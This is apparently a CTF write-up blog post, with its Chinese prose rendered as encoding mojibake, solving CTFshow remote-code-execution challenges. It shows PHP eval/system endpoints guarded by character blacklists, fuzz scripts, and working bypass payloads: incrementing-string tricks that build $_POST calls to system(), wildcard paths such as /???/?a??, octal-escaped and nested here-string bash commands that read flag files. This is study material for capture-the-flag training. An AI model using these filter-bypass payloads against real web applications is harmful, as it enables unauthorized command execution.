<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//() + , . / 0 1 ; = [] _</span></span><br><span class="line">é™åˆ¶<span class="number">105</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=([].[])[0]; </span><br><span class="line">//è¿™é‡Œå°±æ˜¯ä¸Šé¢çš„æ•°ç»„æ‹¼æ¥ï¼Œå¼ºåˆ¶è¿”å›ArrayArray, å–ç¬¬ä¸€ä¸ªA</span><br><span class="line">$_=($_/$_.$_)[0]; </span><br><span class="line">//è¿™é‡Œæ˜¯å…³é”®phpçš„è®¡ç®—ä¸Šé¢æœ‰è¯´ï¼Œå…¶å®è¿™é‡Œéº»çƒ¦äº†ï¼Œåªæ˜¯å½“æ—¶ä¸çŸ¥é“, è¿™é‡Œè¿”å› N</span><br><span class="line">$_++; //O</span><br><span class="line">$__=$_.$_++; </span><br><span class="line">//è¿™é‡Œæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥$_ç­‰äºP, $__=PO, å…¶å®è¿™é‡Œæ‰æ˜¯ç¬¬äº”é¢˜çš„å…³é”®å˜¿å˜¿ï¼Œå¾ˆå¤š74çš„å°±æ˜¯å¡åœ¨è¿™</span><br><span class="line">$_++; // Q</span><br><span class="line">$_++; // R</span><br><span class="line">$_++; // S</span><br><span class="line">$_=_.$__.$_.++$_; //è¿™é‡Œæœ€åä¸€ä¸ªä¹Ÿæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥æœ€åä¸€ä½æ˜¯T, $_ = _POST</span><br><span class="line">$$_[_]($$_[1]); // $_POST[_]($_POST[1]);</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºNä¸‹é¢å°±æœ‰postçš„æ‰€æœ‰å­—æ¯ï¼Œè€Œä¸”æ¯”è¾ƒè¿‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=%24_%3D%28%5B%5D.%5B%5D%29%5B0%5D%3B%24_%3D%28%24_/%24_.%24_%29%5B0%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24__.%24_.%2B%2B%24_%3B%24%24_%5B_%5D%28%24%24_%5B1%5D%29%3B&amp;_=system&amp;1=ls</span><br></pre></td></tr></table></figure>

<h2 id="rce4"><a href="#rce4" class="headerlink" title="rce4"></a>rce4</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¯”ä¸Šä¸€ä¸ªå°‘äº†1ï¼Œè€Œä¸”å­—ç¬¦æ•°è¦æ±‚æ›´å°‘äº†ã€‚æ‰€ä»¥éœ€è¦æˆ‘ä»¬å‹ç¼©å¾—æ›´çŸ­ã€‚ä¸å½±å“æˆ‘ä»¬ä½¿ç”¨(0&#x2F;0)æ¥æ„é€ NAN, ä½†æ˜¯æ›´ä¸ºä¼˜ç§€çš„å†™æ³•å¯ä»¥æ˜¯<code>$a=(_/_._)[0];</code>ç›´æ¥å¾—åˆ°å­—æ¯Nï¼Œpayloadæ„é€ è¿‡ç¨‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(_/_._)[0];//ç›´æ¥æ‹¼æ¥æˆå­—ç¬¦ä¸²å¹¶åˆ‡ç‰‡</span><br><span class="line">$o=++$a;//$o=++$aæ˜¯å…ˆæŠŠ$aè¿›è¡Œè‡ªå¢ï¼Œè‡ªå¢å®Œæˆä¹‹åå†å°†å€¼è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€å¥ç»“æŸçš„æ—¶å€™ $aå’Œ$oéƒ½æ˜¯O</span><br><span class="line">$o=++$a.$o;//$o=&gt;PO,$a=&gt;P</span><br><span class="line">$a++;//Q</span><br><span class="line">$a++;//R</span><br><span class="line">$o.=++$a;//$o=&gt;POS,$a=&gt;S</span><br><span class="line">$o.=++$a;//$o=&gt;POST,$a=&gt;T</span><br><span class="line">$_=_.$o;//_POST</span><br><span class="line">$$_[0]($$_[_]);//$_POST[0]($_POST[_]);</span><br></pre></td></tr></table></figure>

<p>è¿™ä½å¸ˆå‚…å†™çš„å¤ªæ£’äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<h2 id="rce5"><a href="#rce5" class="headerlink" title="rce5"></a>rce5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzzè„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//      $()+,./;=[]_</span></span><br></pre></td></tr></table></figure>

<p>â€‹     phpinfoå®‰è£…äº†ä¸€ä¸ªæ‰©å±•gettextï¼Œè¯¥æ‰©å±•æ”¯æŒå‡½æ•°<code>_()</code> ,ç›¸å½“äº<code>gettext()</code>ï¼Œç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=_(a/a)[a];//ç›¸å½“äºgettext(0/0)[0],å¾—åˆ°N</span><br><span class="line">$_=++$a;//O</span><br><span class="line">$_=_.++$a.$_;//_PO</span><br><span class="line">$a++;$a++;//R</span><br><span class="line">$_.=++$a.++$a;//_POST</span><br><span class="line">$$_[a]($$_[_]);//$_POST[a]($_POST[_])</span><br></pre></td></tr></table></figure>

<p>è‡³äºä¸ºä»€ä¹ˆ<code>$_=$a.$a++;</code>è¿™ä¸€æ­¥å¾—åˆ°çš„æ˜¯POè€Œä¸æ˜¯OPï¼Œæˆ–è€…OOï¼Œè€Œ<code>$_=_.$a.$a++;</code>å¾—åˆ°çš„æ˜¯<code>_OO</code>,ç»è¿‡å’Œç”¨è¿™ç§åšæ³•çš„å¸ˆå‚…ä»¬è®¨è®ºï¼Œç›®å‰åˆ†æä¸‹æ¥æœ€æœ‰å¯èƒ½çš„åŸå› æ˜¯ï¼ŒPHPåœ¨åšå­—ç¬¦ä¸²æ‹¼æ¥çš„è¿‡ç¨‹ä¸­ï¼ˆ.æ“ä½œï¼‰ï¼Œæ˜¯ä¸€ä¸ªä»å·¦åˆ°å³é€’å½’çš„è¿‡ç¨‹ï¼Œè€Œ<code>++</code>æ“ä½œç±»ä¼¼äºä¸€ä¸ªå‡½æ•°ï¼Œphpåœ¨æ‰§è¡Œå®Œå‡½æ•°åï¼Œå†åšæ‹¼æ¥çš„æ“ä½œï¼Œ<code>$_=$a.$a++;//PO</code>è¿™é‡Œç›¸å½“äºå…ˆæ‰§è¡Œäº†<code>$a++</code>æ“ä½œï¼ˆå‡½æ•°ï¼‰ï¼Œå¹¶å¾—åˆ°<code>$a++</code>çš„è¿”å›å€¼ï¼Œç„¶åå’Œå·¦ä¾§çš„<code>$a</code>å˜é‡è¿›è¡Œæ‹¼æ¥ï¼Œæ­¤æ—¶<code>$a</code>å·²ç»æ˜¯Päº†ã€‚è€Œ<code>$_=_.$a.$a++;</code>æ—¶å…ˆæ‰§è¡Œäº†<code>_</code>å’Œ<code>$a</code>çš„æ‹¼æ¥ï¼Œè€Œåå†æ‰§è¡Œ<code>$_=&#39;_O&#39;.$a++</code>ï¼Œæ‰€ä»¥å¾—åˆ°çš„æ˜¯<code>_OO</code>ã€‚*ä»¥ä¸Šæ‰€æœ‰å‡ä¸ºçŒœæµ‹ï¼Œå…·ä½“æœºåˆ¶éœ€ç ”ç©¶PHPæºç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ä¸å¯è§å­—ç¬¦è¦æŠ“åŒ…ä¼ å‚ï¼Œç©ºæ ¼æ¢æˆ+å·</p>
<p>68ä½</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//å·§å¦™çš„æŠŠä¸¤æ¬¡$_++æ”¾åœ¨ä¸€èµ·</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span><span class="comment">//$aç›´æ¥æ‹¼æ¥å‡º_POST</span></span><br><span class="line"><span class="variable">$$a</span>[_POST](<span class="variable">$$a</span>[_])<span class="comment">//$_POST[_POST]($_POST[_])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">CTFshow-RCEæé™å¤§æŒ‘æˆ˜å®˜æ–¹wp - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p>
<p>è¿™ä½å¸ˆå‚…å†™çš„å¥½æ£’</p>
<p><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">https://blog.csdn.net/qq_61955196/article/details/127932968</a></p>
<h2 id="æé™å‘½ä»¤æ‰§è¡Œ1"><a href="#æé™å‘½ä»¤æ‰§è¡Œ1" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ1"></a>æé™å‘½ä»¤æ‰§è¡Œ1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•flagé‡Œï¼Œæˆ–è€…ç›´æ¥è¿è¡Œæ ¹ç›®å½•getflag</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;,$ctfshow))&#123;</span><br><span class="line">            system($ctfshow);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;????????&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzzä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)) . <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//+ ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™äº†æç¤ºï¼š<strong>æœ¬å¥—é¢˜ç›®è¿è¡Œç¯å¢ƒå‡ä¸ºCENTOS7</strong></p>
<p>ä½†æ˜¯è¿™æ˜¯æ ¹æ®wpçš„ï¼Œæˆ‘æœ¬åœ°centos7æ— æ³•æ‰§è¡Œ&#x2F;getflag</p>
<p>è§£æ³•ä¸€</p>
<p>&#x2F;getflag</p>
<p>ç»™å‡ºpayload: ctf_show&#x3D;&#x2F;?????a?</p>
<p>è§£æ³•äºŒï¼š &#x2F;bin&#x2F;base64 &#x2F;flag</p>
<p> payload: ctf_show&#x3D;&#x2F;???&#x2F;?a??64 &#x2F;??a?</p>
<p>è§£æ³•ä¸‰</p>
<p>ctf_show&#x3D;&#x2F;bin&#x2F;bash &#x2F;flag</p>
<p>payloadï¼š ctf_show&#x3D;&#x2F;???&#x2F;?a?? &#x2F;??a?</p>
<h2 id="æé™å‘½ä»¤æ‰§è¡Œ2"><a href="#æé™å‘½ä»¤æ‰§è¡Œ2" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ2"></a>æé™å‘½ä»¤æ‰§è¡Œ2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>bp fuzzä¸€ä¸‹</p>
<p>![](C:\various files\blog\myblog\source_posts\æé™å‘½ä»¤æ‰§è¡Œ\QQæˆªå›¾20230411135838.png)</p>
<p>![](C:\various files\blog\myblog\source_posts\æé™å‘½ä»¤æ‰§è¡Œ\QQæˆªå›¾20230411135932.png)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p>python fuzzè„šæœ¬</p>
<p>payloadï¼š &#x2F;getflag</p>
<p>ä½†æ˜¯æˆ‘åœ¨centos7ä¸Šè¯•äº†è¯•å¹¶æ²¡æœ‰æˆåŠŸ</p>
<p>åŒæ ·ï¼Œå…¶ä»–å®éªŒç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27; #ls æˆåŠŸ</span><br><span class="line">$&#x27;\57\146\154\141\147&#x27;        # /flag   æˆåŠŸ</span><br><span class="line">$&#x27;\57\147\145\164\146\154\141\147&#x27; # /getflag å¤±è´¥</span><br><span class="line">$&#x27;\164\141\143\40\57\146\154\141\147&#x27; #/tac /flag å¤±è´¥</span><br><span class="line">æŠ¥é”™å†…å®¹bash: tac /flag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure>

<p>èƒ½è§£å‡ºé¢˜ç›®çš„payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$&#x27;\57\147\145\164\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="æé™å‘½ä»¤æ‰§è¡Œ3"><a href="#æé™å‘½ä»¤æ‰§è¡Œ3" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ3"></a>æé™å‘½ä»¤æ‰§è¡Œ3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()01&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>åœ¨linux ä¸­ï¼Œ</p>
<p>å•å¼•å·â€™â€™ï¼ŒåŒå¼•å·â€â€çš„åŒºåˆ«æ˜¯</p>
<p>å•å¼•å·â€™â€™å‰¥å¤ºäº†æ‰€æœ‰å­—ç¬¦çš„ç‰¹æ®Šå«ä¹‰ï¼Œå•å¼•å·â€™â€™å†…å°±å˜æˆäº†å•çº¯çš„å­—ç¬¦ï¼Œã€‚</p>
<p>åŒå¼•å·â€â€åˆ™å¯¹äºåŒå¼•å·â€â€å†…çš„å‚æ•°æ›¿æ¢($)å’Œå‘½ä»¤æ›¿æ¢(&#96;&#96;)æ˜¯ä¸ªä¾‹å¤–ã€‚</p>
<p>æ¯”å¦‚è¯´ n&#x3D;3</p>
<p>echo â€˜$nâ€™</p>
<p>ç»“æœå°±æ˜¯$n</p>
<p>æ”¹æˆåŒå¼•å· echo â€œ$nâ€ï¼Œç»“æœå°±æ˜¯3</p>
<p>[(9æ¡æ¶ˆæ¯) linuxä¸­å•å¼•å·â€˜ ,åŒå¼•å·â€œ, åå¼•å· <code> </code>, $, $(), ${}ä¸å˜é‡_linuxå•å¼•å·ä¸­å¼•ç”¨å˜é‡_TGAOçš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=%E5%8D%95%E5%BC%95%E5%8F%B7">https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=å•å¼•å·</a> ï¼šä¸è¿›è¡Œè½¬è¯‘å’Œè·å– å˜é‡ ï¼Œè¾“å‡ºåŸå­—ç¬¦ä¸² echo â€˜dateâ€™ date åŒå¼•å·,Dec 29 10%3A33%3A40 CST 2020 echo date date)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ))å±äºæ‰§è¡Œè®¡ç®—å…¬å¼ï¼Œç­‰ä»·äº$[ ]ï¼Œ$( )å’Œ` `å±äºå‘½ä»¤æ›¿æ¢ï¼Œ$&#123; &#125;å±äºå˜é‡æ›¿æ¢</span><br></pre></td></tr></table></figure>

<p>bashé‡ŒäºŒè¿›åˆ¶å¯è¡¨ç¤ºä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((2#100))</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p> ä½†æ˜¯ç”±äºæŠŠ2è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ä½è¿ç®—ç¬¦å·æ„é€ å‡º2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((1&lt;&lt;1))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;ä¸‰ä¸ªå°äºå·(here-strings)ï¼Œè¯­æ³•ï¼šcommand [args] &lt;&lt;&lt;[&quot;]$word[&quot;]ï¼›$wordä¼šå±•å¼€å¹¶ä½œä¸ºcommandçš„stdin</span><br></pre></td></tr></table></figure>

<p>è§£æä¸€æ¬¡åcat &#x2F;flag ä¸ºå­—ç¬¦ä¸²</p>
<p>ç©ºæ ¼å¹¶æ²¡æœ‰è¢«è§£æ</p>
<p>ä½¿ç”¨ä¸¤æ¬¡here-stringsï¼Œä½¿å…¶æˆä¸ºæ ‡å‡†è¾“å…¥å»æ‰§è¡Œè¿™ä¸ªå¤æ‚å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="æé™å‘½ä»¤æ‰§è¡Œ4"><a href="#æé™å‘½ä»¤æ‰§è¡Œ4" class="headerlink" title="æé™å‘½ä»¤æ‰§è¡Œ4"></a>æé™å‘½ä»¤æ‰§è¡Œ4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶ä¸€ç›´æ²¡åšå‡ºæ¥çš„æŸèµ›æŸé¢˜æ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span><br><span class="line">//flagåœ¨æ ¹ç›®å½•flagé‡Œ</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz ä¸€ä¸‹</p>
